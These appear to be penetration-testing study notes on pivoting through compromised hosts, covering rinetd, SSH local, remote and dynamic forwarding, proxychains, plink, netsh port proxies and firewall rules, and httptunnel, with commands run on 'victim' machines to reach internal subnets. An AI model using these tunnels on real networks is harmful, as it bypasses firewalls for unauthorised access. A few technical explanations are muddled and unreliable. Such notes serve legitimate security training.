Forwarding and Tunneling

Port Forwarding 
Port Forwarding occurs when traffic for an IP:PORT combination
end up being redirected to a different IP:PORT combination. This 
can be necessary when you want to access devices connected to a 
LAN but not to the internet. 

We can do this using the rinetd tool, which can be installed
using pacman -S rinetd the /etc/rinetd.conf file is where you 
place forwarding rules. The rule format is:

bindaddress bindport connectaddress connectport

Example: Redirect any traffic received on port 80 to 
a different IP address on port 80:

0.0.0.0 80 <TARG IP> 80

is how you would write the rule. If you write this rule and 
run sudo service rinetd restart you will see a listener on
the device running on 80. Confirm this with ss -antp | grep 80

Now, any machine that connects to port 80 on the listening 
machine will be able to access the TARGET IP in the
forwarding rule. This will give internet access to the 
blocked machine.

SSH Forwarding
Encrypted, Bi-Directional, Simple As

LOCAL FORWARDING
Use SSH to tunnel a local port to a remote server.
This is useful for pivoting between subnets, like 
when you compromise a client with 2 network interfaces
and you can only access 1 from your attacker machine. 

On your victim machine, run this:
ssh -N -L [bindaddress:]port:host:hostport [username@address]

-N prevents remote command execution,
and -L creates the local port forward.
Let's see an example: You compromised a machine behind a firewall
that can see two subnets. These are 10.11.0.x and 192.168.1.x 
To reach a machine in the second subnet, we need to pivot through
the double interface machine. SSH is enabled on the dual machine, 
so we can port forward through it and enumerate the 192.168.1.x subnet.
To do this, we run the following command on our attacking machine:

sudo ssh -N -L 0.0.0.0:<aPORT>:192.168.1.x:<bPORT> user@10.11.0.x

Here, any incoming connection on the attacker at aPORT will be forwarded
to bPORT on the 192.168.1.x address through the middle connection at
10.11.0.x

If we chose to forward 445, for example, we could then query 
smbclient pointed at localhost and it would actually send 
queries to the machine at 192.168.1.x:445 This would allow
us to enumerate samba two subnets away like it were on our own machine. 

REMOTE FORWARDING
Remote forwarding is the reverse of local forwarding, where the ports
are selected on the remote machine and then sent back to the local one.

Imagine you have user access to a Linux client on an internal network.
There is a MySQL server on 3306, but the firewall is blocking inbound
22. If outbound 22 is allowed, you can still do a remote forward. 
On the victim machine, run the following command:
ssh -N -R <attackerIP>:<atkPORT>:127.0.0.1:<remPORT> attacker@attackaddress

The attacker can then attack a localhost port and receive information
from the remote host as if it were their own local service.

DYNAMIC FORWARDING
This is when the local listner tunnels traffic to any remote destination
using a proxy. using ssh -D will create a local dynamic SOCKS4 layer 7
proxy tunneled with ssh. 

ssh -N -D <bindaddress>:PORT user@server
Example: ssh -N -D 127.0.0.1:8080 student@remote.IP

To make use of this proxy we have to edit our /etc/proxychains.conf
and add:
socks4 127.0.0.1 8080

now to run commands, you append proxychains to the front of the 
command and you can run it through the tunnel.

IF YOU ARE RUNNING PROXYCHAINS TO TARGET INTERNAL (Internet Protected)
services, you have to run your commands targeting 127.0.0.1 because
the commmand is coming out and being interpreted by the proxied machine.
Therefore, if you have these devices:

192.168.119.146 (attacker, forwarding)
192.168.146.52  (victim, receiving forward)

And you want to scan .146.52 for services, if you pass:

proxychains nmap -p- 192.168.146.52

then .146.52 will reach out to the router, resolve its own address
and scan itself. Instead, you have to pass:

proxychains nmap -p- 127.0.0.1

Which doesn't make any sense initially, but you are feeding commands
to the device which are then interpreted over there. Port forwarding
alters your perspective of the network because you take over another
body.

WINDOWS:
When using Windows, the ssh client can sometimes not be installed by default.
A well supported tool you can upload to the victim is plink.exe
plink is part of the PuTTY project. The syntax is very similar. Here is
what a remote forward would look like on plink:
plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4

To do this non-interactively, send cmd.exe /c echo y | [plink command]

This will help the necessary dialogue through when you try to make the forward
occur.

If you have SYSTEM, you can just use netsh because UAC won't affect you.
To use this, IP Helper service must be enabled and IPv6 must be enabled
for the network interface we want to use.

netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110

This command will create a port proxy between two IPv4 addresses. This example
was used to solve a forward between two network interfaces on a compromised
host that could be bridged to allow enumeration of the internal subnet.

netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow

Altering firewall rules is also allowed with netsh, and is often necessary to
prevent the outbound traffic from being blocked.

sudo mkdir /mnt/win10_share
sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
ls -l /mnt/win10_share/
cat /mnt/win10_share/data.txt

How to mount an smb share and interact with it.



HTTP TUNNELING:
The above scenarios only work if SSH is enabled. If SSH isn't enabled you don't
have a shell to work with. The httptunnel tool will help with this. This tool
uses an htc and hts utility for client and server. When we use it, you want a
client connection on your attacker machine, a server connection on your victim
adjacent to the firewall, and a local forward between your adjacent and your
deep victms. This will move traffic from deep victim to adjacent victim
who then encapsulates the traffic as http and sends it otw to your client machine.

Here is how you would do that:
ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
hts --forward-port localhost:8888 1234
htc --forward-port 8080 10.11.0.128:1234

The local ssh forward is generated on the adjacent machine reaching out to the
deep machine. The hts command then creates the http tunnel that will be used.
htc is run on the attacker to pick up the traffic. Now, if the attacker
runs rdp or other commands across 8080, they will be able to reach the deep
target.
